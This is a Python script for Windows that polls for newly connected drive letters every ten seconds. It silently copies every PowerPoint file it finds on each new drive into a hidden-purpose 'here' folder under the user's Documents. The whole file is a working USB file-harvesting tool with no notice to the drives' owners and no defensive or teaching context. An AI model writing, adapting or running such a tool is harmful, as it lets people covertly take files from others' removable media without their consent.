import ctypes
import itertools
import os
import string
import platform
import subprocess
from pathlib import Path
import shutil
import time
import fnmatch

from ctypes.wintypes import MAX_PATH

dll = ctypes.windll.shell32
buf = ctypes.create_unicode_buffer(MAX_PATH + 1)
if dll.SHGetSpecialFolderPathW(None, buf, 0x0005, False):
    doc=buf.value
else:
    doc="C:\\"




def isPluggedIn(driveLetter):
    drive_bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    l= list(itertools.compress(string.ascii_uppercase,
               map(lambda x:ord(x) - ord('0'), bin(drive_bitmask)[:1:-1])))
    if driveLetter in l:
        return True
    else:
        return False

try:
    os.mkdir(doc+'\\here\\')
except Exception as e:
    hi=1
d={}
f=0
for i in range(26):
    letter=chr(ord('A')+i)
    d[letter]=1
while(1):
    for i in range(26):
            letter=chr(ord('A')+i)
            if isPluggedIn(letter):
                if d[letter]==0:
                    print(letter)
                    for root, dirnames, filenames in os.walk(letter+":\\"):
                        for filename in fnmatch.filter(filenames, '*.ppt*'):
                            print(os.path.join(root, filename))
                            shutil.copyfile(os.path.join(root, filename),doc+'\\here\\'+str(filename))

                    # for filename in Path(letter+":\\").rglob('*.pptx'):
                    #     #print(os.path.basename(filename))
                    #     print(filename)
                        #shutil.copyfile(filename,doc+'\\here\\'+str(os.path.basename(filename)))
                d[letter]=1
            else:
                d[letter]=0
    time.sleep(10)
